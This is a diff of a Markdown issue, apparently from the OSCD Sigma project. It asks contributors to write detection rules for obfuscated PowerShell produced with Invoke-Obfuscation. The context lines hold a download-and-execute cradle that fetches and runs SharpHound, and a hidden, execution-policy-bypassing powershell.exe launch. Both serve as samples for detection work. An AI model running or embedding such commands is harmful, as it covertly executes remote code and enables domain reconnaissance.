@@ -15,9 +15,9 @@ powershell.exe -executionpolicy bypass –noprofile –windowstyle hidden –fil
 ```powershell
 Import-Module ./Invoke-Obfuscation.psd1
 Invoke-Obfuscation
-### Oremise for command #1 ###
+# Premise for command #1
 SET SCRIPTBLOCK Invoke-Expression (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/BloodHoundAD/BloodHound/a7ea5363870d925bc31d3a441a361f38b0aadd0b/Ingestors/SharpHound.ps1'); Invoke-BloodHound
-### Oremise for command #2 ###
+# Premise for command #2
 SET SCRIPTBLOCK powershell.exe -executionpolicy bypass –noprofile –windowstyle hidden –file script.ps1
 ```
 #### Just pick the obfuscation method and the relevant сases you prefer and develop Sigma rule(s) for them. When you're done, create a Pull Request to OSCD Sigma branch and specify this issue's number and the case numbers you've solved:  
